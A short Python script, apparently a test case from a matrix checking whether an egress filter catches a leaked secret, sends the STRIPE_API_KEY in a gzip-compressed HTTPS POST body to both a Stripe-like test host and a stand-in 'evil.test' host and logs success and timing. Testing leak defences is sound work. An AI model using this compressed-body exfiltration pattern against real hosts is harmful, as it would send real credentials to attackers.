# Python, HTTP/1.1, key in a gzip-compressed request body.
import gzip, json, os, socket, ssl, time
cfg = json.load(open("matrix.json"))
key = os.environ["STRIPE_API_KEY"]
for name in ("api.stripe.test", "evil.test"):
    ctx = ssl.create_default_context(cafile=cfg["ca"])
    t = time.perf_counter()
    try:
        with ctx.wrap_socket(socket.create_connection(("127.0.0.1", cfg["ports"][name])), server_hostname=name) as s:
            body = gzip.compress(("token=" + key).encode())
            s.sendall(("POST /v1/tokens HTTP/1.1\r\nHost: %s\r\nContent-Encoding: gzip\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (name, len(body))).encode() + body)
            s.recv(100)
        print(name, "ok", "TIME %.3f" % ((time.perf_counter() - t) * 1000))
    except OSError as e:
        print(name, "refused", type(e).__name__)
